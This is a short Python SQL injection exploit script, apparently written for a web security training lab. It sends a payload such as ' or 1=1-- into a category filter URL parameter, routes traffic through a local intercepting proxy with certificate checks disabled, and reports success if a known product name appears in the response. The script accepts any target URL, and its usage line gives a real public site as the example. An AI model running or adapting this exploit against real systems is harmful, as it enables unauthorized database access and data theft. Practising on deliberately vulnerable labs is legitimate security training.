# For modifying query on url. ?category=1' or 1=1--
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def exploit_sqli(url,payload):
    uri = '/filter?categories='
    r = requests.get(url+uri+payload,verify=False,proxies=proxies)
    if "Cat Grin" in r.text:
        print("[*] SQL Injection was successful.")
    else:
        print("[*] SQL Injection was not successful.")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] Example: {sys.argv[0]} www.google.com "1=1"')
        sys.exit(-1)
    
    exploit_sqli(url,payload)